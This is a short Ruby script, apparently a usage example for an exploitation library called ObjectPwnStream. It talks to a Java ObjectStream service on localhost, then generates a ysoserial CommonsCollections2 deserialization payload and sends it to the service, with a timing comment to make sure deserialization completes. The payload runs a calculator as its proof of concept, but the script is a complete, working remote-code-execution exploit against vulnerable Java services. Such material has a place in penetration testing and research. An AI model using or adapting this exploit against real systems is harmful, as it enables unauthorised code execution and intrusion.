require 'ObjectPwnStream'

pwnStream = ObjectPwnStream::PwnStream.new("127.0.0.1", 9090)
pwnStream.connect!
pwnStream.open_streams!
pwnStream.socket
puts "readInt(): 0x%X" % pwnStream.read_int
pwnStream.write_int 0x1337
puts "readUTF(): " + pwnStream.read_utf
pwnStream.write_utf "ObjectPwnStream"
puts "readShort(): 0x%X" % pwnStream.read_short
pwnStream.write_short(0xabcd)
puts "readLong(): %d" % pwnStream.read_long(signed=true)
pwnStream.write_long(-12345, signed=true)
puts "readObject(): " + pwnStream.read_object.inspect
pwnStream.ysoserial_generate!("./ysoserial.jar",
                              "CommonsCollections2",
                              "gnome-calculator",
                              encode: true,
                              windows: false)
pwnStream.write_object(ysoserial: true)

# closing the socket without sleep is not recommended
# most of the time the socket get closed before the deserialization process.
sleep 1
pwnStream.close!
